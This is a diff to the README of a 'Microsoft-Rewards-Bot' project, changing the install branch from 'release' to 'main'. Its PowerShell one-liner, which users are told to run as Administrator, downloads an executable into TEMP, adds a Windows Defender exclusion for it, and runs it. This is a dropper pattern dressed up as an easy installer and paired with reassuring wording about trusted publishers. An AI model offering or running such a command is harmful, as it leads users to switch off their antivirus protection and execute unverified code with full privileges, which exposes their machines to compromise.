@@ -43,10 +43,10 @@ Remote Dash
 Open PowerShell as Administrator, then effortlessly run the one-line installer:
 
 ```powershell
-$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/refs/heads/release/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
+$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/refs/heads/main/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
 ```
 
-*The installer will fetch the latest robust binary engine directly from the release branch and deploy it locally.*
+*The installer will fetch the latest robust binary engine directly from the main branch and deploy it locally.*
 
 > **Note:** Only accept software execution from trusted publishers and verified repositories.
 
@@ -57,13 +57,13 @@ $f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-
 For total control, clone and install manually via NPM:
 
 ```bash
-git clone --branch release https://github.com/QuestPilot/Microsoft-Rewards-Bot.git
+git clone --branch main https://github.com/QuestPilot/Microsoft-Rewards-Bot.git
 cd Microsoft-Rewards-Bot
 npm install
 npm start
 ```
 
-The `release` branch is the supported public channel. Auto-update reads that branch directly and the compiled official Core plugin is built for the documented Node.js target.
+The `main` branch is the supported public channel. Auto-update reads that branch directly and the compiled official Core plugin is built for the documented Node.js target.
 
 ---
 
